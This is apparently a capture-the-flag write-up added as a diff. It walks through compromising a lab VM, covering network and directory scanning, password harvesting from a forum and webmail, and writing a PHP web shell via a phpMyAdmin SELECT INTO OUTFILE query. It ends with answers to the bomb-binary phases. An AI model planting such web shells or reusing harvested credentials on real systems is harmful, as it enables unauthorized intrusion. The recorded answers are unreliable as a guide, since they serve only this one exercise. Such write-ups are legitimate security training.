@@ -1,0 +1,170 @@
+/*		PART ONE	*/
+
+When booting on ISO we see a prompt in order to login on server. We don't have any of the info needed and there is no visible IP address.
+
+	-> By using the command "ifconfig" it displays the status of the currently active interfaces. We can see that there is an interface 'vboxnet0' with an IP address (192.168.56.1) which refers to virtualBox so we can deduce that on the range .1-255 there is perhaps the IP address of the launched server.
+
+	-> By using the command "nmap 192.168.56.1-255" on this range of addresses. It will show what hosts are available on the network and other useful information. We can now see that there is a responsive and reachable host on the network: 192.168.56.103 with multiples ports listening and associated with some services:
+		Port 21/tcp (FTP): This port is open, indicating that there is an FTP
+		(File Transfer Protocol) service running on the target host.
+		FTP is used for transferring files between computers over a network.
+
+		Port 22/tcp (SSH): This port is open, indicating that there is an SSH
+		(Secure Shell) service running on the target host.
+		SSH is a secure protocol used for secure remote access to the host.
+
+		Port 80/tcp (HTTP): This port is open, indicating that there is an HTTP
+		(Hypertext Transfer Protocol) service running on the target host.
+		Port 80 is the default port for web traffic, so it suggests that there is a web server running.
+
+		Port 143/tcp (IMAP): This port is open, indicating that there is an IMAP
+		(Internet Message Access Protocol) service running.
+		IMAP is used for accessing and managing email messages on a mail server.
+
+		Port 443/tcp (HTTPS): This port is open, indicating that there is an HTTPS
+		(HTTP Secure) service running.
+		HTTPS is used for secure web browsing and communication, often associated with a web server.
+
+		Port 993/tcp (IMAPS): This port is open, indicating that there is an IMAPS service running.
+		IMAPS is a secure version of IMAP used for encrypted email access.
+
+We can now have a look on the port 80 and 443 to see if there is a webpage.
+
+/*		PART TWO		*/
+
+When inspecting theses pages, there is nothing very interesting but maybe there is other web object that we are not aware of.
+
+	-> By using a content scanner we can look for existing (and/or hidden) web objects. We are goin to use dirb: It basically works by launching a dictionary based attack against a web server and analyzing the responses. In order to use dirb, we made a dockerfile running this tool (see Ressources). We now run "docker build -t aaa ." then "docker run -it aaa" and ./configure, make. Dirb can be used: "./dirb https://192.168.56.103:443 wordlists/common.txt".
+
+Among other very useful information we can see that there is some web objects:
+		==> DIRECTORY: https://192.168.56.103:443/forum/
+		==> DIRECTORY: https://192.168.56.103:443/phpmyadmin/
+		==> DIRECTORY: https://192.168.56.103:443/webmail/
+
+We can now have a look on these web pages.
+
+/*		PART THREE		*/
+
+By inspecting the /forum we can see that there is a thread about some login problems by an user 'lmezard'
+	-> Surprise, surprise using Ctrl+f on the login we can find something that looks like a password: !q\]Ej?*5K5cy*AJ. We can now try the login and password.
+In the user profile we find a mail: laurie@borntosec.net. It surely can be used on the page /webmail right? It works!
+There is a mail 'DB Acces' which seems to contains the login of root and its password: root/Fg-'kKXBj87E:aJ$. We can now access to the database /phpmyadmin
+
+/*		PART FOUR		*/
+
+On inspecting the database, we can find a lot of information but they are not so exploitable but there is a tool on phpmyadmin that we can use: it can run SQL queries on server "localhost" !
+
+	->	https://www.w3schools.com/sql/sql_injection.asp
+	->	https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405
+
+We need to create a backdoor to the server by create a .php that runs system(). We need to find a location where we can create this file on the server:
+		->	SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/exploit.php'
+
+It's a succes! We can now run command on https://192.168.56.103/forum/templates_c/exploit.php?cmd=[YOUR COMMAND] (%20 or + signs to represents space) then we can find a directory LOOKATME with a password file. 'cat' it: lmezard:G!@M6f4Eatau{sF"
+
+/*		PART FIVE		*/
+
+With these login and password we can't connect using ssh. So we use ftp connection using "ftp" command. It works, using ls we can see two files that we need to retrieve
+	->	get [filename]
+
+	-> cat fun:
+int main() {
+	printf("M");
+	printf("Y");
+	printf(" ");
+	printf("P");
+	printf("A");
+	printf("S");
+	printf("S");
+	printf("W");
+	printf("O");
+	printf("R");
+	printf("D");
+	printf(" ");
+	printf("I");
+	printf("S");
+	printf(":");
+	printf(" ");
+	printf("%c",getme1());
+	printf("%c",getme2());
+	printf("%c",getme3());
+	printf("%c",getme4());
+	printf("%c",getme5());
+	printf("%c",getme6());
+	printf("%c",getme7());
+	printf("%c",getme8());
+	printf("%c",getme9());
+	printf("%c",getme10());
+	printf("%c",getme11());
+	printf("%c",getme12());
+	printf("\n");
+	printf("Now SHA-256 it and submit");
+}
+
+It seems that there is a lot of .pcap file, in order to retrieve them, we'll "tar -xf" fun. We have now a directory ft_fun with these files. Lets grep 'getme' on all the files: grep 'getme' *
+
+0T16C.pcap:char getme4() {
+32O0M.pcap:char getme7() {
+331ZU.pcap:char getme1() {
+4KAOH.pcap:char getme5() {
+91CD0.pcap:char getme6() {
+B62N4.pcap:char getme3() {
+BJPCP.pcap:char getme8() {
+BJPCP.pcap:char getme9() {
+BJPCP.pcap:char getme10() {
+BJPCP.pcap:char getme11() {
+BJPCP.pcap:char getme12()
+BJPCP.pcap:	printf("%c",getme1());
+BJPCP.pcap:	printf("%c",getme2());
+BJPCP.pcap:	printf("%c",getme3());
+BJPCP.pcap:	printf("%c",getme4());
+BJPCP.pcap:	printf("%c",getme5());
+BJPCP.pcap:	printf("%c",getme6());
+BJPCP.pcap:	printf("%c",getme7());
+BJPCP.pcap:	printf("%c",getme8());
+BJPCP.pcap:	printf("%c",getme9());
+BJPCP.pcap:	printf("%c",getme10());
+BJPCP.pcap:	printf("%c",getme11());
+BJPCP.pcap:	printf("%c",getme12());
+G7Y8I.pcap:char getme2() {
+
+So it seems the functions are written in those .pcap files. Lets cat them. It seems that the function is incomplete and there is an indication //file<...>. Lets grep the following file. Then cat the .pcap file!
+
+We can found some getme() functions:
+	char getme1()	{	return 'I';}
+	char getme2()	{	return 'h';}
+	char getme3()	{	return 'e';}
+	char getme4()	{	return 'a';}
+	char getme5()	{	return 'r';}
+	char getme6()	{	return 't';}
+	char getme7()	{	return 'p';}
+	char getme8()	{	return 'w';}
+	char getme9()	{	return 'n';}
+	char getme10()	{	return 'a';}
+	char getme11()	{	return 'g';}
+	char getme12()	{	return 'e';}
+
+We found the password that we need to SHA-256:	330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+Now lets connect with login laurie and this password via ssh: "ssh -p 22 laurie@192.168.56.103". There is 2 files, a README and a binary. We can retrieve it to reverse it.
+	-> scp -r -P 22 laurie@192.168.56.103:~/bomb ./
+
+The README goes:
+	HINT:
+P
+ 2
+ b
+
+o
+4
+
+
+/*		PART SIX		*/
+
+Upon reversing the binary with ghidra, we find the answers to the ./bomb program.
+	Phase1:	"Public speaking is very easy."
+	Phase2:	"1 2 6 24 120 720"
+	Phase3:	"0 q 777"	"1 b 214"	"2 b 755"	"3 k 251"	"4 o 160"	"5 t 458"	"6 v 780"	"7 b 524"(multiple 'good' answers)
+	Phase4:	"9"
+	Phase5:	"opekma" or "opekmq" (multiple 'good' answers)
+	Phase6: "4 2 6 3 1 5"
